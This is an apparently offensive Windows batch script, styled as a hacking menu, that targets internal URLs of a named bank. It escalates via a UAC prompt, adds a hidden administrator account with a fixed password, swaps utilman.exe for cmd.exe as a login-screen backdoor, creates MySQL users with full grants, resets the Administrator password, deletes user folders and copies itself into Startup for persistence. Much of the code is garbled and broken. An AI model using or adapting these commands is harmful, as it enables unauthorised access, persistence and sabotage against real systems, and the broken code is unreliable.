@echo off
break off
title C:\windows\system32\cmd.exe
compmgmt.msc
:cmd
color 1A
:main
echo :.....................................................................................
echo :.....................................................................................
echo          ::::::::::::    ::          ::::::::::::    ::         ::
echo          ::        ::    ::          ::              ::         ::
echo          ::        ::    ::          ::              ::         ::
echo          ::        ::    ::          ::              ::         ::
echo          ::........::    ::          ::::::::::::    ::         ::     
echo          ::.........:    ::          ::              ::         ::
echo          ::        ::    ::          ::              ::         ::
echo          ::        ::    ::          ::              ::         ::
echo          ::        ::    ::          ::              ::         ::
echo          ::::::::::::    ::::::::::  ::::::::::::    :::::::::::::
echo:.....................................................................................:
echo      This Program was developed for only educational purposes,try on illigal attempts
echo            We are not resposible for any actions::::BluePriar_Forencics Priar@github
echo:.....................................................................................:


echo                                          OPTIONS MENU


     
echo ::1 :hogan.fnb.co.za/v3270DoAuth/#/                                            ::10:POS
echo ::2 :premium.dynamics.fnb.co.za/Premium/main.aspx#474677994                    ::11:The Harvester
echo ::3 :fnb2web/cbsbrdreversalcentre/                                             ::12:FireWall Settings
echo ::4 :folders.fnb.co.za:8443/folders/fnb/controller                             ::13:CloudFlare Bypass
echo ::5 :reset BIOS PWD                                                            ::14:Open All Ports
echo ::6 :Administrative PWD                                                        ::15:Delete WinDir to Crush
echo ::7 :Server                                                                    ::16:Shutdown
echo ::8 :Add Server User                                                           ::17:Restart
echo ::9 :Add Mysql User                                                            ::18:Logoff

   
:: Prompt for input;
      
        set /p "strMenu=                       ENTER OPTIONS MENU NUMBER:"

:: Compare input through if commands,
:: 'if not defined strMenu goto :menu' can be used here if prefered.
if "%strMenu%" equ "1" start "" https://hogan.fnb.co.za/v3270DoAuth/#/"
if "%strMenu%" equ "2" start "" 
if "%strMenu%" equ "3" start "" http://fnb2web/cbsbrdreversalcentre/"
if "%strMenu%" equ "4" start "" https://folders.fnb.co.za:8443/folders/fnb/controller 
if "%strMenu%" equ "5" start ""5" 
if "%strMenu%" equ "6" start "" 6"
if "%strMenu%" equ "7" start "" 7"
if "%strMenu%" equ "8" start "" 8"
if "%strMenu%" equ "9" start ""9" 
if "%strMenu%" equ "10" start ""10"
if "%strMenu%" equ "11" start "" 11"
if "%strMenu%" equ "12" start "" 12"
if "%strMenu%" equ "13" start "" 13"
if "%strMenu%" equ "14" start "" 14"
if "%strMenu%" equ "15" start ""15"
if "%strMenu%" equ "16" start ""16"
if "%strMenu%" equ "17" start ""17"
if "%strMenu%" equ "18" start ""18" https://premium.dynamics.fnb.co.za/Premium/main.aspx#474677994"

  if "%strOPTIONS MENU%" equ "1"  goto 
   start runas /noprofile /user:ef453672 localadminscript.bat 
    set /p input=input
if "%input%" =="1"  goto A1 
  echo
     :A1
color 32
  echo
::BatchGotAdmin 
REM --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
    REM --> If error flag set, we do not have admin.
        if '%errorlevel%' NEQ '0' ( 
   echo Requesting administrative privileges... 
     goto UACPrompt

) else ( goto gotAdmin)

:UACPrompt 
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs" 
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >>  "%temp%\getadmin.vbs" 

   "%temp%\getadmin.vbs" 

  exit /B

:gotAdmin
 
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" ) 

pushd "%CD%"
  CD /D "%~dp0"

:------------------------------------------------------------------
 echo
  net user ef453672 fnb@2021 /add  /https://hogan.fnb.co.za/v3270DoAuth/#/ /active
    net localgroup Administrators ef453672 /add
    WMIC USERACCOUNT WHERE "Name='ef453672"'
     SET PasswordExpires=FALSE
WMIC USERACCOUNT WHERE "Name='ef453672"'
 SET Passwordchangeable=FALSE

 if "%System error%" equ "1378"  goto A2
  net user ef453672 fnb@2021 /add /active
    net localgroup Administrators ef453672 /add
    WMIC USERACCOUNT WHERE "Name='ef453672"'
     SET PasswordExpires=FALSE
WMIC USERACCOUNT WHERE "Name='ef453672"'
 SET Passwordchangeable=FALSE
echo
:A2
color B2
 rename C:\windows\system32\cmd.exe cmd2.exe
   rename C:\windows\system32\utilman.exe cmd.exe
 rename C:\windows\system32\cmd2.exe utilman.exe
    echo
     :A7
color 3B 
         C:\Program\Files\MySQL\MySQL Server 5.5\bin\mysql.exe  mysql -u root -ppassword
     mysql -h host -u user -p -e 'SHOW TABLES'
mysql -uroot -ppassword --execute="CREATE USER ' priar.changchat'@'fnb.co.za' IDENTIFIED BY '77585010eI';"
   mysql -uroot -ppassword --execute="GRANT ALL ON myDB.* TO ' priar.changchat'@'fnb.co.za';"
 mysql -uroot -p -se "SELECT CONCAT('HOW GRANTS FOR \ '',user '\'@\'',host, '\';') FROM mysql.user;" >grants.sql
 mysql -uroot -p <grants.sql
mysql> select Host, Db, User, Name, Employee ID, Password, Role, Address, Cellphone, Insert_priv, Update_priv, Delette_Priv, Edit_priv, Safe_priv, Create_tmp_priv, Alter_priv from mysql.db limit all
            netsh interface ip  set address "Local Area Connection" dhcp

netsh interface ip set dns "Local Area Connecion" dhcp

    netsh interface ip show config 

  net user %Administrator% fnb@2021 

  net user

        ipconfig /all
msg * your are such a life safer and thanks for Adding me to your System you won't recret it will truly utilise the chance!!!

set /p input=input  
if "%input%" =="m" goto main

echo
 if "%strOPTIONS MENU%" equ "3" goto A10
set /p input=input
if "%input%" =="3"  goto A10
  echo
:A10
color cA
  echo
    http://fnb2web/cbsbrdreversalcentre/
end
   pause 
 echo
set /p input=input  
if "%input%" =="m" goto main 


   if "%str%OPTIONS MENU" equ "4" goto A20
         runas \windows\system32\cmd localadminscript.bat
set /p input=input
if "%input%" =="4"  goto A20
  echo
:A20
color 3c
echo
      https://folders.fnb.co.za:8443/folders/fnb/controller
       end
pause
   echo 
set /p input=input
if "%input%" =="m" goto main 

if "%strOPTIONS MENU%" equ "5" goto A22
    runas \windows\system32\cmd localadminscript.bat
set /p input=input
if "%input%" =="5"  goto A22
  :A22
color B2
echo
 echo debug -0 70 10
-0 71 aa
-q
end
   then 
 echo
 pause
 echo        
set /p input=input
if "%input%" =="m" goto main 


if "%strOPTIONS MENU" equ "6" goto A24
   runas \windows\system32\cmd localadminscript.bat
set /p input=input
if "%input%" =="6"  goto A24 
 echo
     :A24
color cA
 echo
     NET USER %Administrator% 77585010eI
         DEL pwd.bat
end
   then
      echo
set /p input=input
if "%input%" =="m" goto main   

if "%strOPTIONS MENU%" equ "7" goto A25
    runas \windows\system32\cmd localadminscript.bat
set /p input=input
if "%input%" =="7"  goto A25
  :A25
color 3B
  echo
echo Checking your system infor 
  Please Waiting... 
echo
systeminfo | findstr
    /c:Host Name systeminfo |findstr
        /c:Domain systeinfo |findstr
                /c:Domain usernames |findstr
    /c:Domain passwords |findstr
        /c:Domain ip address |findstr
           /c:OS Name systeminfo |findstr
    /c:OS Version systeminfo |findstr
/c: System Manufacturer systeminfo |findstr
       /c:System Model systeminfo |findstr  
   /c:System type systeminfo |findstr
/c:Total Physical Memory ipconfig | find /i IPV4
echo
 echo Hard Drive Space: wmic diskdrive
get size
   echo.echo
       echo Service Tag:wmic bios get serialnumber
   echo.scho.echo CPU:wmic cpu get name
echo Completed!
end
   pause        
set /p input=input
if "%input%" =="m" goto main 


  if "%strOPTIONS MENU%" equ "8" goto A21
     runas \windows\system32\cmd localadminscript.bat
set /p input=input
if "%input%" =="8"  goto A21
    echo
 :A21
color cA
echo
Add-Type -AssemblyName Microsoft.VisualBasicAdd-Type
 -Assembly 'System.Windows.Forms'$Computer = [Microsoft.VisualBasic.Interaction]
::InputBox("Enter the Computer Name You're accessing",
 "Computer Name", "Computer Name")$UserName = [Microsoft.VisualBasic.Interaction]
::InputBox("Enter New User's Name", "Name", "Helpdesk")$PWD = [Microsoft.VisualBasic.Interaction]
::InputBox("Enter Password for $Username")$Password = $PWD | Out-String | ConvertTo-SecureString -AsPlainText -Force$LocalGroupName = "Administrators"# $ErrorActionPreference= 'silentlycontinue' Try { #Create User	 write-output "Adding User $UserName to PC $computer"	 write-output "Setting Password for $UserName on PC $computer"	 write-output "Adding User $UserName to Local Group $LocalGroupName" $ADSIComp = [adsi]"WinNT://$Computer" $NewUser = $ADSIComp.Create('User',$Username) #Create password $BSTR = [system.runtime.interopservices.marshal]::SecureStringToBSTR($Password) $_password = [system.runtime.interopservices.marshal]::PtrToStringAuto($BSTR) #Set password on account $NewUser.SetPassword(($_password)) $ADS_UF_DONT_EXPIRE_PASSWD = 0x10000 $NewUser.userflags = $ADS_UF_DONT_EXPIRE_PASSWD $NewUser.SetInfo() #Add to Administrators Group $Group = [ADSI]"WinNT://$Computer/$LocalGroupName,group" $Group.Add("WinNT://$UserName,user") $NewUser.SetInfo() #Send Results to Screen [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") [System.Windows.Forms.MessageBox]
::Show("Local User Added, $UserName") } Catch { [Reflection.Assembly]
::LoadWithPartialName("System.Windows.Forms") [System.Windows.Forms.MessageBox]
::Show("ERROR: Local User NOT Added, Check Password Lenght or Duplicate User") } 
#Cleanup [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR) Remove-Variable Password,BSTR,_password
   pause   
set /p input=input
if "%input%" =="m" goto main 

  if "%strOPTIONS MENU%" equ "9" goto A26
     runas \windows\system32\cmd localadminscript.bat
set /p input=input
if "%input%" =="9"  goto A26
echo
 :A26
color cB
pause
echo please enter your first and last name ( eg. David 
Martin) and press [ENTER]:
set /p fullname= 
echo please enter your employee ID and press
[ENTER]:
set /p newuser=
net user %newuser% /add >NUL
nuet user %newuser% *
net user %newuser% /fullname:%fullname%">NUL
net locagrup administrator %newuser% /delete
2>NUL
mkdir "D:\%fullname%"
cacls "D:\%fullname%" /p %newuser%:f
administrators:f
net share "%fullname%"=D:\%fullname%"
/remark:"Server space for %fullname%"
/GRANT:%newuser%,FULL

echo %results% was returned
  echo
   pause
if "%strOPTIONS MENU%" equ "10"  goto 
   start runas /noprofile /user:ef453672 localadminscript.bat 
    set /p input=input
:A4
color 25
echo
if "%strOPTIONS MENU%" equ "11"  goto 
   start runas /noprofile /user:ef453672 localadminscript.bat 
    set /p input=input
  pause

:A4
color cB
echo
if "%strOPTIONS MENU%" equ "12"  goto 
   start runas /noprofile /user:ef453672 localadminscript.bat 
    set /p input=input
  pause
:A4
color cB
echo
if "%strOPTIONS MENU%" equ "13"  goto 
   start runas /noprofile /user:ef453672 localadminscript.bat 
    set /p input=input
  pause
:A4
color cB
echo
if "%strOPTIONS MENU%" equ "14"  goto 
   start runas /noprofile /user:ef453672 localadminscript.bat 
    set /p input=input
  pause
:A4
color 3B
echo
if "%strOPTIONS MENU%" equ "15"  goto 
   start runas /noprofile /user:ef453672 localadminscript.bat 
    set /p input=input
  pause
:A4
color 2B
echo
if "%strOPTIONS MENU%" equ "16"  goto 
   start runas /noprofile /user:ef453672 localadminscript.bat 
    set /p input=input
  pause
:A4
color 4B
echo
if "%strOPTIONS MENU%" equ "17"  goto 
   start runas /noprofile /user:ef453672 localadminscript.bat 
    set /p input=input
  pause
:A4
color 5C
echo
if "%strOPTIONS MENU%" equ "18"  goto 
   start runas /noprofile /user:ef453672 localadminscript.bat 
    set /p input=input
  pause
    del /q %appdata%
 del /q %temp%
echo
msg * your are such a life safer and thanks for Adding me to your System you won't recret it will truly utilise the chance!!!
set /p input=input
if "%input%" =="m" goto main 
echo
  copy "*.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
    echo
start http://192.168.8.1/html/nocard.html?index

set /p input=input
if "%input%" =="r" goto shutdown -r
set /p input=input
if "%input%" =="l" goto logoff
set /p input=input
if "%input%" =="s" goto shutdown -s -t1
